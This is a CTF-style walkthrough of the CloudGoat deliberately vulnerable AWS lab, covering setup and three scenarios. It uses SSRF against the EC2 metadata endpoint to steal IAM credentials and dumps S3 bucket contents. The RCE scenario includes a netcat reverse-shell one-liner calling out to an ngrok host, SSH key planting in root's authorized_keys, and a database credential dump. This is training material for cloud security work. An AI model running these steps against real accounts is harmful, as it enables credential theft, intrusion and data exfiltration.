# AWS Cloud Goat 

Cloud Goat is a AWS deployment container which is basically a CTF for teaching AWS absuses

## Setting up Cloud Goat

Git clone the repo for cloud goat and, install the requirements and run 

<img src="https://i.imgur.com/Ln27rrK.png"/>

<img src="https://i.imgur.com/N7pDEpJ.png"/>

Cloud goat also requires `Terraform`  which is used for managing the cloud infrastructure through templates and policies through cli or through code 

https://www.terraform.io/downloads

<img src="https://i.imgur.com/ZKdUXOj.png"/>

After downloading terraform, move it to `/usr/bin/` and after that you can run `cloudgoat.py`

<img src="https://i.imgur.com/Q6I4nbr.png"/>

Before creating a scenario, we need to have a free tier AWS account and for that you do need to provide valid details reagrding the credit card but no amount will be deducted

<img src="https://i.imgur.com/1qy0wPI.png"/>

Login as the root user on aws management console

<img src="https://i.imgur.com/lp7Iaho.png"/>

After logging we need to create a user 

<img src="https://i.imgur.com/6OojvxF.png"/>

<img src="https://i.imgur.com/yifvqsH.png"/>

On this user we need to  set `AdministratorAccess` policy 

<img src="https://i.imgur.com/Lt7zC6E.png"/>

Skip the `Add tags` option

<img src="https://i.imgur.com/ObiaIML.png"/>

<img src="https://i.imgur.com/mYqN53b.png"/>

After creating the user, We'll get AWS session and secret key

<img src="https://i.imgur.com/PGTHqYo.png"/>

Now use `awscli` to configure aws session for this user by creating a profile becuase this script will be using the AWS resources from our account so make to remove them after you are done with the scenarios 

<img src="https://i.imgur.com/yckQNvp.png"/>

You may encounter an error where cloudgoat script may fail to install `terraform-provider-archive` so to fix this issue manually download the binary and place it in `/usr/bin`

<img src="https://i.imgur.com/NvTJiXn.png"/>

## Cloud Breach s3 (Medium)
In this scenario we need to query the metadata of EC2 from a reverse proxy and access AWS session then using those keys we need to extract data from s3 bucket, so creating this scenario

![](https://i.imgur.com/t6SNUdU.png)

To start attacking, we can get the IP address from the generated `start.txt` file

![](https://i.imgur.com/WtlxFq1.png)

Running an nmap scan (it isn't necessary) we can see that it's an ec2 instance

![](https://i.imgur.com/JLrpz27.png)

But it doesn't show anything on the web server

![](https://i.imgur.com/tvilCQi.png)

Making a request with `curl` shows that it's configured to work as a proxy to make requests to ec2 metadata

![](https://i.imgur.com/UnoMROE.png)

AWS has an IP for metadata which is `169.254.169.254`, so we need to edit the Host header of the request and make a request to `/latest`

![](https://i.imgur.com/yEYQ0uh.png)

So we can make a request to `/latest/meta-data/iam/security-credentials/cg-banking-WAF-Role-cloud_breach_s3_cgidkt0wpx0w0k` , which will show AWS access key

![](https://i.imgur.com/QtlXuMk.png)

Adding a profile using these keys 

![](https://i.imgur.com/QNXtCnx.png)

We can verify the keys if they are working with 

```bsah
aws sts get-caller-identity --profile cloud_breach
```

![](https://i.imgur.com/ryYt2EY.png)

Now we don't know what's the s3 bucket, we can list s3 buckets if it's associated with the AWS key

```bash
aws s3 ls --profile cloud_breach
```

![](https://i.imgur.com/wvQmHZ3.png)

To view contents of this s3 bucket we can list it by giving the bucket name which is `cg-cardholder-data-bucket-cloud-breach-s3-cgidkt0wpx0w0k` 

```bash
aws s3 ls s3://cg-cardholder-data-bucket-cloud-breach-s3-cgidkt0wpx0w0k --profile cloud_breach
```

![](https://i.imgur.com/RsXnMHI.png)

To copy all files from s3 bucket we can use `cp` to copy files, `--recusrive` to copy all files `.` for the the destination to be the current path

```bash
aws s3 --recursive cp s3://cg-cardholder-data-bucket-cloud-breach-s3-cgidkt0wpx0w0k . --profile cloud_breach
 ```

![](https://i.imgur.com/zLABNKo.png)

Accessing any of these file mean that we have compromised s3 bucket which completes this scenario

![](https://i.imgur.com/zyW9gIk.png)

We can now destory this challenege with  `python3 cloudgoat.py destroy cloud_breach_s3`

![](https://i.imgur.com/WlGnKmq.png)

## EC2 SSRF (Medium)
In this scenario we have access to IAM user through which we have to enumerate permissions and find a lambda function through which we can access EC2 instance and extract data from s3 bucket

To create this scenario, we need to run `python3 cloudgoat.py create ec2_ssrf`

![](https://i.imgur.com/iyAETZF.png)

But at the end this will fail because python3.6 is not supported for creating lambda functions, we can fix it by replacing it with python3.9 by editing `scenarios/ec2_ssrf/terraform/lambda.tf`

![](https://i.imgur.com/3KRPeK4.png)

![](https://i.imgur.com/K7i9wH2.png)

Now running the script again to create the scenario 

![](https://i.imgur.com/m2EgwcP.png)

In `start.txt` we havet the acount id and AWS access key for `solus` IAM user

![](https://i.imgur.com/jt0IdNR.png)

So let's create a profile for solus user with AWS keys

![](https://i.imgur.com/FhS072a.png)

To verify if the AWS keys are working

```bash
aws sts get-caller-identity --profile solus
```

![](https://i.imgur.com/dhx3Bqt.png)

Listing lambda functions with 

```bash
aws lambda list-functions --profile solus --region us-east-1
```

![](https://i.imgur.com/e1IvK23.png)

This reveals EC2 access key, to use them we need to create another profile for this access key, also if we try invoking this function it won't work

![](https://i.imgur.com/BBPwCiL.png)

So creating aws profile 

![](https://i.imgur.com/tJIB2t4.png)

Running `ec2 describe-instances` to view the instances associated with the access key

```bash
aws ec2 describe-instances --profile solus_ec2 --region us-east-1 
```

![](https://i.imgur.com/de5XXD6.png)

Scrolling a little down we'll get the instance's IP address which will also reveal public IP

![](https://i.imgur.com/eIQvhGJ.png)

Running nmap scan on EC2 instance to see which ports are open

![](https://i.imgur.com/YMeTjJV.png)

It has a web server running so let's visit that, the default page had some issues as the creator didn't handle the errors properly

![](https://i.imgur.com/EbtKOZC.png)

We can resolve this by including `url` GET parameter

![](https://i.imgur.com/Azg9uh0.png)

As the page tells that this is about SSRF, we can try making a requesst to EC2 metadata on IP `169.254.169.254`

![](https://i.imgur.com/txZq9P9.png)

Making a request to `/latest/meta-data/iam/security-credentials/` we'll get the role `cg-ec2-role-ec2_ssrf_cgidne4wv0ljch` for which we can get read the AWS keys

![](https://i.imgur.com/XFkY57s.png)

![](https://i.imgur.com/LT7ddB1.png)

With `aws configure` we can use the AWS keys to create a profile for `ec2_ssrf`

![](https://i.imgur.com/kCNzhvz.png)

We also need to add the session token 

![](https://i.imgur.com/gnzl7Ig.png)

![](https://i.imgur.com/IssRIIA.png)

To access s3 bucket, we first to list them with `aws s3 ls --profile ec2_ssrf`

![](https://i.imgur.com/bqcdspr.png)

Listing the contents of this bucket will shows us a text file

![](https://i.imgur.com/NIm9qcs.png)

Downloading this file with `cp`, we'll get AWS keys for another user which seems to be privileged from from the name of the text file

![](https://i.imgur.com/VKvowoQ.png)

![](https://i.imgur.com/hOezBLv.png)

Checking this user's identitiy, it's `shepard`

![](https://i.imgur.com/wgRmnQq.png)
Now invoking the function which we tried before with solus user but this time trying with shepard

```bash
aws lambda invoke --function-name cg-lambda-ec2_ssrf_cgidne4wv0ljch --profile ec2_ssrf_admin --region us-east-1 ./output.txt
```
![](https://i.imgur.com/obcYkFD.png)

Reading the response from the text file, we'll see that we completed this scenario

![](https://i.imgur.com/N3c1u1D.png)

We can destory this scenario with `cloudgoat.py destroy ec2_ssrf`

![](https://i.imgur.com/KPBQAKZ.png)

![](https://i.imgur.com/A0zQmTL.png)

## RCE Web App (Hard)
In this scenario we have access to two IAM users and access s3 bucket which will lead to a vulnerable web app for rce  

We can create this scenario with `python3 cloudgoat.py create rce_web_app`

![](https://i.imgur.com/9xyQVoq.png)

But at the end it showed an error that it wasn't able to create RDS (Amazon Relational Database) DB instance because it couldn't find postgres 9.6 because that has been deprecated

![](https://i.imgur.com/QJXYRrD.png)

![](https://i.imgur.com/1gdi0uV.png)

This issue can be resolved by replacing the postgres version to 12

![](https://i.imgur.com/MtOg77a.png)

![](https://i.imgur.com/g0b6M35.png)

Here we have two users `lara` and `mcduck`, so first I'll take the path from `lara`

## Path from Lara
Creating a profile for lara by using access and secret key

![](https://i.imgur.com/Tb1A3qV.png)

We can verfiy if the keys are working

![](https://i.imgur.com/ZHX87pQ.png)

From this IAM user we can access s3 bucket 

```bash
aws s3 ls --profile lara
```

![](https://i.imgur.com/aKV1kqI.png)

We can see there are three buckets but this user can access only `cg-logs` bucket

![](https://i.imgur.com/rKxPAcr.png)

To download `cg-lb-logs` folder recursivley

```bash
aws s3 cp --recursive s3://cg-logs-s3-bucket-rce-web-app-cgid3ntl2q2i88 . --profile lara
```

![](https://i.imgur.com/KLf5NPG.png)

On accessing that folder, there's a log file which contained some requests

![](https://i.imgur.com/69nuRUg.png)

![](https://i.imgur.com/Cv32NVN.png)

Making a request to see these urls are alive but they were down

![](https://i.imgur.com/NjO1stY.png)

So we know there might be a web app running, we can try listing an ec2 instances through this profile

```bash
aws ec2 describe-instances --profile lara --region us-east-1 
```

![](https://i.imgur.com/iZIGQHK.png)

We scan this ec2 instance for open ports which shows that there's only ssh open the instance

![](https://i.imgur.com/hON1Vjf.png)

So there's nothing we can do from the ec2, the log file belongs to a load balancer, so we can try lisiting the load balancers with `elbv2 describe-load-balancers`

```bash
aws elbv2 describe-load-balancers --profile lara --region us-east-1
```

![](https://i.imgur.com/oq4bwYV.png)

We can visit this url and access the site

![](https://i.imgur.com/katXehA.png)

This talks about visiting "the secret url" which we can find from the logs

![](https://i.imgur.com/t5vBH8F.png)

This gives us a functionality to execute commands which we can abuse to get a reverse shell

![](https://i.imgur.com/6OW0Nwq.png)

For reverse shell, we can use `ngork` which is used for exposing local port over the internet, I was having issues with ngrok not working with kali linux so I swtiched to ubuntu for getting a shell using busybox variant of `netcat`

```bash
echo "rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 0.tcp.ap.ngrok.io 11400 >/tmp/f" |base64 -w0
```

![](https://i.imgur.com/69eaCZG.png)

![](https://i.imgur.com/NICaB1a.png)

We can run ngrok with `ngrok tcp 2222`

![](https://i.imgur.com/HYCqymr.png)

But issue is when getting a reverse shell, the application stops responding

![](https://i.imgur.com/AkP5YzE.png)

![](https://i.imgur.com/goBA5AD.png)

We can try accessing root's ssh key but it wasn't generated 

![](https://i.imgur.com/mERF5FN.png)

Since we are root user, we can add our ssh public key and login with the private key

![](https://i.imgur.com/odxyCZ3.png)

```bash
echo "ssh public key " > /root/.ssh/authorized_keys
```

On adding the key I was getting an error due to `Unterminated quoted string`, I am not sure why I was getting that but I wasn't able to add the ssh key

![](https://i.imgur.com/XJqDbd0.png)

If we check root's authorized_keys file, it says to login as ubuntu 

![](https://i.imgur.com/I9xwM3p.png)

Either the ssh key is being truncated for some reason or it needs a proper format for the key as AWS supports `D25519` and `2048-bit` SSH-2 RSA keys for Linux instances, there is even an issue reported for this part

![](https://i.imgur.com/QQ9El9z.png)

![](https://i.imgur.com/3QHq63C.png)

Generate the key again with  `ed25519`

![](https://i.imgur.com/VAcZyJ1.png)

```bash
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG5QcNdp9tUZRQvmkPMDfZpXciiy+7YVTdNI9RyUPbcR arz@kali" > /root/.ssh/authorized_keys
```

![](https://i.imgur.com/2cvMauW.png)

We can see that this worked perfectly with no errors which means we can now login into the ec2 instance we found earlier

![](https://i.imgur.com/3D2Ip31.png)

Having access to EC2, we can query for the metadata from the magic AWS IP `169.254.169.254`

```bash
curl 169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-rce_web_app_cgidd9pk8lqvym
```

![](https://i.imgur.com/ypRbGSx.png)

Using the keys we can create a new profile for aws session

![](https://i.imgur.com/FUArWZN.png)

![](https://i.imgur.com/Dik2Qjo.png)

With this user we can access the secrets s3 bucket and find `db.txt`

![](https://i.imgur.com/NdLbu1o.png)

Downloading the file

![](https://i.imgur.com/fUqUVfm.png)

From this file we'll get the credentials for database

![](https://i.imgur.com/KpiKmhZ.png)

DB instance can be found with `rds describe-db-instances`

```bash
aws rds describe-db-instances --profile rce_web --region us-east-1 
```

<img src="https://i.imgur.com/u4VCLSX.png"/>

This is an internal instance, so we need to access it from ec2

<img src="https://i.imgur.com/IZ8oUgD.png"/>

Database can be accessed with `psql` 

```bash
psql -h cg-rds-instance-rce-web-app-cgidd9pk8lqvym.cvqhxg0xsdki.us-east-1.rds.amazonaws.com -U cgadmin -d cloudgoat
```
<img src="https://i.imgur.com/lSuyXlJ.png"/>

Lisiting the tables with `\d`

<img src="https://i.imgur.com/oKwBEpi.png"/>

we have a table named `sensitive_information`, so let's query the table with `select * from sensitive_information`

<img src="https://i.imgur.com/4OZNipv.png"/>

By having the secret password, the rce scenario will be completed

## Path from McDuck

Using McDuck's aws keys 

<img src="https://i.imgur.com/Zj2B5vy.png"/>

With this user we can try listing s3 buckets 

<img src="https://i.imgur.com/qbt1LHT.png"/>

Now with `lara` we were only able to access the `cg-logs` bucket but with `mcduck` we can access `cg-keystore` bucket 

<img src="https://i.imgur.com/B1Bm3Al.png"/>

Downloading the public and private keys 

<img src="https://i.imgur.com/2WlLPkU.png"/>

<img src="https://i.imgur.com/rUqs5d8.png"/>

From lara we arleady know the IP of the ec2 instance so we can login using ubuntu user through ssh

<img src="https://i.imgur.com/299orqx.png"/>

From here we could either get the keys from metdata or install awscli, access s3 bucket to get the credentials to the database, list the realation database instance and use postgresql client to access database, since we have sudo privileges we can become root user 

<img src="https://i.imgur.com/9alSQFs.png"/>

```bash
apt install awscli
```
<img src="https://i.imgur.com/AgllPVh.png"/>

```bash
aws sts get-caller-identity 
```

<img src="https://i.imgur.com/mrJGJ1F.png"/>

Accessing the s3 bucket to get database credentials 

<img src="https://i.imgur.com/MHAgyhE.png"/>

Now getting database instance's IP

```bash
aws rds describe-db-instances --region us-east-1 
```

<img src="https://i.imgur.com/neo89mr.png"/>

And with the credentials and database's instance we'll able to login and complete the scenario like we did with lara user.

## References
- https://github.com/RhinoSecurityLabs/cloudgoat
- https://www.terraform.io/downloads
- https://rhinosecuritylabs.com/aws/introducing-cloudgoat-2/
- https://pentestbook.six2dez.com/enumeration/cloud/aws
- https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/CHAP_PostgreSQL.html
- https://www.bluematador.com/learn/aws-cli-cheatsheet
- https://github.com/RhinoSecurityLabs/cloudgoat/issues/49
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql
